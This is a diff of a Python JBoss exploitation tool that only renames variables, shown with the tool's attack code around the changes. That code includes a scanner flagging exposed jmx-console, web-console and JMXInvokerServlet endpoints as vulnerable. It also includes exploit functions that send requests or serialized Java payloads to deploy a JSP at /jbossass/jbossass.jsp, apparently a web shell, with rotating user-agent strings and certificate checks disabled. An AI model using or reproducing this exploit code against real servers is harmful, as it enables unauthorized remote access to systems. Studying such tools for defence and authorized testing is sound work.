@@ -49,17 +49,17 @@ timeout = Timeout(connect=3.0, read=7.0)
 pool = PoolManager(timeout=timeout, cert_reqs='CERT_NONE')
 
 
-userAgents = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:38.0) Gecko/20100101 Firefox/38.0",
-              "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",
-              "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
-              "Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0",
-              "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; "
-              ".NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
-              "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1)",
-              "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
-              "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0",
-              "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36",
-              "Opera/9.80 (Windows NT 6.2; Win64; x64) Presto/2.12.388 Version/12.17"]
+user_agents = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:38.0) Gecko/20100101 Firefox/38.0",
+               "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",
+               "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
+               "Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0",
+               "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; "
+               " .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
+               "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+               "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
+               "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0",
+               "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36",
+               "Opera/9.80 (Windows NT 6.2; Win64; x64) Presto/2.12.388 Version/12.17"]
 
 
 def get_successfully(url, path):
@@ -72,7 +72,7 @@ def get_successfully(url, path):
     sleep(5)
     headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Connection": "keep-alive",
-               "User-Agent": userAgents[randint(0, len(userAgents) - 1)]}
+               "User-Agent": user_agents[randint(0, len(user_agents) - 1)]}
     r = pool.request('GET', url+path, redirect=False, headers=headers)
     result = r.status
     if result == 404:
@@ -92,29 +92,29 @@ def check_vul(url):
 
     headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Connection": "keep-alive",
-               "User-Agent": userAgents[randint(0, len(userAgents) - 1)]}
+               "User-Agent": user_agents[randint(0, len(user_agents) - 1)]}
 
-    path = {"jmx-console": "/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo",
-            "web-console" 		: "/web-console/ServerInfo.jsp",
-            "JMXInvokerServlet": "/invoker/JMXInvokerServlet"}
+    paths = {"jmx-console": "/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo",
+             "web-console" 		: "/web-console/ServerInfo.jsp",
+             "JMXInvokerServlet": "/invoker/JMXInvokerServlet"}
 
-    for i in path.keys():
+    for i in paths.keys():
         try:
             print(GREEN + " * Checking %s: \t" % i + ENDC),
-            r = pool.request('HEAD', url+str(path[i]), redirect=False, headers=headers)
-            path[i] = r.status
-            if path[i] in (301, 302, 303, 307, 308):
+            r = pool.request('HEAD', url+str(paths[i]), redirect=False, headers=headers)
+            paths[i] = r.status
+            if paths[i] in (301, 302, 303, 307, 308):
                 url_redirect = r.get_redirect_location()
                 print(GREEN + "[ REDIRECT ]\n * The server sent a redirect to: %s\n" % url_redirect)
-            elif path[i] == 200 or path[i] == 500:
+            elif paths[i] == 200 or paths[i] == 500:
                 print(RED + "[ VULNERABLE ]" + ENDC)
             else:
                 print(GREEN + "[ OK ]")
         except:
             print(RED + "\n * An error occurred while connecting to the host %s\n" % url + ENDC)
-            path[i] = 505
+            paths[i] = 505
 
-    return path
+    return paths
 
 
 def auto_exploit(url, exploit_type):
@@ -213,7 +213,7 @@ def exploit_jmx_console_main_deploy(url):
 
     headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Connection": "keep-alive",
-               "User-Agent": userAgents[randint(0, len(userAgents)-1)]}
+               "User-Agent": user_agents[randint(0, len(user_agents) - 1)]}
 
     r = pool.request('HEAD', url+payload, redirect=False, headers=headers)
     return get_successfully(url, "/jbossass/jbossass.jsp")
@@ -253,7 +253,7 @@ def exploit_jmx_console_file_repository(url):
 
     headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Connection": "keep-alive",
-               "User-Agent": userAgents[randint(0, len(userAgents) - 1)]}
+               "User-Agent": user_agents[randint(0, len(user_agents) - 1)]}
     pool.request('HEAD', url+payload, redirect=False, headers=headers)
     return get_successfully(url, "/jbossass/jbossass.jsp")
 
@@ -334,7 +334,7 @@ def exploit_jmx_invoker_file_repository(url):
     headers = {"Content-Type": "application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue",
                "Accept": "text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2",
                "Connection": "keep-alive",
-               "User-Agent": userAgents[randint(0, len(userAgents)-1)]}
+               "User-Agent": user_agents[randint(0, len(user_agents) - 1)]}
 
     r = pool.urlopen('POST', url+"/invoker/JMXInvokerServlet", redirect=False, headers=headers, body=payload)
     result = r.status
@@ -389,7 +389,7 @@ def exploit_web_console_invoker(url):
         "Content-Type": "application/x-java-serialized-object; class=org.jboss.console.remote.RemoteMBeanInvocation",
         "Accept": "text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2",
         "Connection": "keep-alive",
-        "User-Agent": userAgents[randint(0, len(userAgents) - 1)]}
+        "User-Agent": user_agents[randint(0, len(user_agents) - 1)]}
     r = pool.urlopen('POST', url+"/web-console/Invoker", redirect=False, headers=headers, body=payload)
     result = r.status
     if result == 401:
